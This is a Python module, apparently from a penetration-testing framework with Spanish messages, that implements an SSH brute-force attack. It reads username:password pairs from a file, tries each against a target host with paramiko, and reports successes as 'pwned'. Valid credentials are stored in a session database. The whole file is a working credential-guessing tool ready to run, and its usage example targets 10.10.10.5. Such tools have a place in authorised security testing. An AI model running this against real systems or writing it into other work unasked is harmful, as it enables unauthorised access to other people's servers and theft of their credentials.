# scripts/ssh/attack/brute_force.py
import time
import paramiko
from scripts.base import BaseScript
from core.output import print_result, console
from core import session_db

class Script(BaseScript):
    name        = "brute-force"
    protocol    = "ssh"
    category    = "attack"
    description = "Fuerza bruta SSH con lista de pares usuario:contraseña."

    EXAMPLES = [
        {"flag": "--credfile", "desc": "Fichero con pares usuario:contraseña",
         "good": "ssh --script=brute-force -t 10.10.10.5 --credfile creds.txt",
         "bad":  "ssh --script=brute-force -t 10.10.10.5 (sin --credfile)"},
    ]

    def run(self, **kwargs):
        port          = int(kwargs.get("port") or 22)
        timeout       = int(kwargs.get("timeout") or self.target.timeout or 5)
        credfile      = kwargs.get("credfile")
        delay         = float(kwargs.get("delay") or 0.5)
        stop_on_first = kwargs.get("stop_on_first", True)
        ip            = self.target.ip

        if not credfile:
            console.print("[red]Falta --credfile (formato usuario:contraseña por línea).[/red]")
            return None

        try:
            pairs = []
            with open(credfile) as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"): continue
                    if ":" in line:
                        u, p = line.split(":", 1)
                        pairs.append((u.strip(), p.strip()))
        except OSError as e:
            console.print(f"[red]No se pudo leer {credfile}: {e}[/red]"); return None

        print_result("SSH", ip, "info", f"brute-force: {len(pairs)} par(es) a probar")

        valid = []
        for user, password in pairs:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=password,
                               timeout=timeout, allow_agent=False, look_for_keys=False)
                client.close()
                print_result("SSH", ip, "pwned", f"credencial válida: {user}:{password}")
                session_db.save_credential(ip, user, password, "password",
                                           valid=True, source="ssh_bruteforce")
                valid.append((user, password))
                if stop_on_first:
                    break
            except paramiko.AuthenticationException:
                print_result("SSH", ip, "fail", f"fallido: {user}:{password}")
            except Exception as e:
                print_result("SSH", ip, "fail", f"error: {e}")
            if delay:
                time.sleep(delay)

        return valid
